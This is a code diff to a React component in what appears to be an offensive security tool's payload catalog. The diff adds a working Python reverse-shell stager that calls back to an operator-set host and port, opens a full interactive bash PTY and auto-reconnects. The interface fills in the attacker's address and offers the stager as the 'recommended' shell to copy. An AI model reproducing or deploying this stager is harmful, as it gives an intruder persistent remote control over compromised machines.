@@ -35,6 +35,43 @@ const CATALOG: { group: string; items: P[] }[] = [
   },
 ];
 
+// The robust shell: a reconnecting-PTY stager. Unlike the raw one-liners below, this gives
+// a real PTY (full interactivity from byte one — no stabilize dance), announces a session
+// token so it rebinds to the SAME recce session, and auto-reconnects on drop. A script, not
+// a compiled implant — plain transport, no toolchain.
+const STAGER = `python3 -c 'import socket,os,pty,select,time,signal
+T="{TOKEN}";H="{LHOST}";P={PORT}
+while 1:
+ s=None;pid=0
+ try:
+  s=socket.socket();s.connect((H,P));s.send(b"RECCE1 "+T.encode()+b"\\n")
+  pid,fd=pty.fork()
+  if pid==0:os.execv("/bin/sh",["/bin/sh","-c","exec bash -i 2>/dev/null||exec sh -i"])
+  while 1:
+   r=select.select([s,fd],[],[])[0]
+   if s in r:
+    d=s.recv(1024)
+    if not d:break
+    os.write(fd,d)
+   if fd in r:
+    d=os.read(fd,1024)
+    if not d:break
+    s.send(d)
+ except Exception:pass
+ try:
+  if pid>0:os.kill(pid,signal.SIGKILL)
+ except:pass
+ try:
+  if s:s.close()
+ except:pass
+ time.sleep(5)'`;
+
+const genToken = () => {
+  const a = new Uint8Array(8);
+  crypto.getRandomValues(a);
+  return "t" + Array.from(a, (b) => b.toString(16).padStart(2, "0")).join("");
+};
+
 function CopyLine({ text }: { text: string }) {
   const [ok, setOk] = useState(false);
   return (
@@ -46,13 +83,26 @@ function CopyLine({ text }: { text: string }) {
 
 export function PayloadCatalog({ port }: { port: number }) {
   const [lhost, setLhost] = useState(location.hostname);
-  const fill = (t: string) => t.split("{LHOST}").join(lhost).split("{PORT}").join(String(port));
+  const [token] = useState(genToken);
+  const fill = (t: string) =>
+    t.split("{LHOST}").join(lhost).split("{PORT}").join(String(port)).split("{TOKEN}").join(token);
   return (
     <div className="payload-catalog">
       <label className="payload-lhost">
         LHOST <input className="scan-in" value={lhost} onChange={(e) => setLhost(e.target.value)}
                      title="the address the target should call back to" />
       </label>
+
+      <div className="payload-group">
+        <div className="payload-group-h robust">★ Robust · auto-reconnect PTY (recommended)</div>
+        <div className="payload-item robust-item">
+          <span className="payload-label">python</span>
+          <code className="payload-code">{fill(STAGER)}</code>
+          <span className="payload-note muted small">full PTY, self-healing — survives drops &amp; rebinds</span>
+          <CopyLine text={fill(STAGER)} />
+        </div>
+      </div>
+
       {CATALOG.map((g) => (
         <div key={g.group} className="payload-group">
           <div className="payload-group-h">{g.group}</div>
